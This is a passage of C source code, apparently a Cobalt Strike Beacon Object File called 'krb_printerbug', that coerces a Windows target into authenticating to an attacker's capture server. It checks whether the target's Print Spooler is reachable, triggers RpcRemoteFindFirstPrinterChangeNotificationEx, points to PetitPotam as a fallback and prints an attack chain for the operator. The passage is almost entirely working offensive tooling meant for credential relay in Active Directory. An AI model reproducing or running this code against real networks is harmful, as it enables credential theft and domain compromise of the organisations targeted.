        BeaconFormatPrintf(&output, "  krb_printerbug /target:dc01.corp.local /capture:web01.corp.local\n");
        BeaconFormatPrintf(&output, "  krb_printerbug /target:DC01 /capture:192.168.1.100 /domain:corp.local\n\n");
        BeaconFormatPrintf(&output, "The BOF will:\n");
        BeaconFormatPrintf(&output, "  1. Check if Print Spooler is accessible on target\n");
        BeaconFormatPrintf(&output, "  2. Trigger RpcRemoteFindFirstPrinterChangeNotificationEx\n");
        BeaconFormatPrintf(&output, "  3. Cause target to authenticate to capture server\n\n");
        BeaconFormatPrintf(&output, "You must have relay/capture infrastructure ready on the capture host.\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
    }

    BeaconFormatPrintf(&output, "[*] Target Machine:  %s\n", target);
    BeaconFormatPrintf(&output, "[*] Capture Server:  %s\n", capture);
    if (domain) BeaconFormatPrintf(&output, "[*] Domain:          %s\n", domain);
    BeaconFormatPrintf(&output, "\n");

    /* Check if Spooler is accessible */
    if (!check_spooler(target, &output)) {
        BeaconFormatPrintf(&output, "\n[-] Print Spooler not accessible on %s\n", target);
        BeaconFormatPrintf(&output, "[*] The service may be disabled or blocked.\n\n");
        BeaconFormatPrintf(&output, "[!] TRY ALTERNATIVE: PetitPotam (MS-EFSRPC coercion)\n");
        if (domain) {
            BeaconFormatPrintf(&output, "    krb_petitpotam /target:%s /capture:%s /domain:%s\n", target, capture, domain);
        } else {
            BeaconFormatPrintf(&output, "    krb_petitpotam /target:%s /capture:%s\n", target, capture);
        }
        goto cleanup;
    }

    /* Trigger the coercion */
    int success = trigger_printerbug_rpc(target, capture, &output);

    /* Print attack chain regardless of success (operator guidance) */
    print_attack_chain(target, capture, domain, &output);

cleanup:
    if (target) free(target);
    if (capture) free(capture);
    if (domain) free(domain);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
